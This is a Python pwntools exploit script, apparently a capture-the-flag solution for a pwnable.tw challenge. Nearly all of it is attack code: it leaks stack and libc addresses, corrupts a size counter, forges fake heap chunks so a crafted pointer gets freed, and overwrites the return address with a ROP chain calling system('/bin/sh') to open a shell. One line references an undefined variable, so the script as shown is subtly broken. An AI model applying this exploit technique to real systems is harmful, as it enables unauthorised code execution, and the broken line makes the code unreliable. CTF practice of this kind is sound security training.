#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

#context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./pwn")
elf = ELF(pwn_file)
libc = ELF("./bc.so.6")

if len(sys.argv) == 1:
    r = process(pwn_file)
    pid = r.pid
else:
    r = remote("chall.pwnable.tw", 10204)
    pid = 0

def debug():
    gdb.attach(r, "b *0x080488C9")

def set(name, age, reason, comment, ans = 'y'):
    r.sendafter("name: ", name)
    r.sendlineafter("age: ", str(age))
    r.sendafter("? ", reason)
    r.sendafter("comment: ", comment)
    r.sendlineafter(": ", ans)

def set2(age, reason):
    r.sendlineafter("age: ", str(age))
    r.sendafter("? ", reason)
    r.sendlineafter(": ", 'y')

set("lee", 1, 'a'*0x50, 'a')
r.recvuntil('a'*0x50)
stack = u32(r.recv(4))
reason = stack - 0xc8 + 0x58

r.recv(4)
a = u32(r.recv(4)) - 0x1b2d60 + 0x2000
libc.address = a
info("libc: " + hex(a))

# overflow to change size1
for i in range(9):
    set("lee", 1, 'a\x00', 'a')
for i in range(90):
    set2(1, 'a')

# fake name ptr
fake_comment = 'a'*0x50
fake_comment += p32(1) + p32(reason + 8)
# fake name to be free
fake_reason = p32(0) + p32(0x41) + 'a'*0x38 + p32(0x41)*2

set("lee", '1', fake_reason, fake_comment)

# input name to overflow ret addr and rop
sh = 'a'*0x38 + p32(0x41)*2 + 'a'*c
sh += p32(libc.sym['system']) + p32(0) + p32(libc.search("/bin/sh").next())
set(sh, '1', p32(0x41), 'a', 'n')

r.interactive()
